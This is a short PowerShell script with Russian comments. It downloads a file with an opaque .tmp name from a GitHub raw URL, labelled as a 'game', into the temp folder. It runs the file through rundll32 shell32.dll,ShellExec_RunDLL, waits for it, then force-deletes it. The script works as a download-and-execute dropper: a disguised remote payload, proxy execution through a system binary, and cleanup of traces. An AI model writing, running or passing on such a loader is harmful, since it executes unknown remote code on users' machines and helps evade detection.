$ErrorActionPreference = "Stop"

$GameUrl = "https://github.com/tema132b-arch/testz/raw/main/bee2059e-df7f-4c09-a69b-821ccd8573c7.tmp"
$TempFile = Join-Path ([IO.Path]::GetTempPath()) "bee2059e-df7f-4c09-a69b-821ccd8573c7.tmp"

Invoke-WebRequest -Uri $GameUrl -OutFile $TempFile -UseBasicParsing

# Запуск через rundll32 с использованием функции shell32.dll
# Синтаксис: rundll32.exe shell32.dll,ShellExec_RunDLL "путь_к_файлу"
$argumentList = "shell32.dll,ShellExec_RunDLL `"$TempFile`""
$proc = Start-Process -FilePath "rundll32.exe" -ArgumentList $argumentList -PassThru
$proc.WaitForExit()

Remove-Item $TempFile -Force -ErrorAction SilentlyContinue
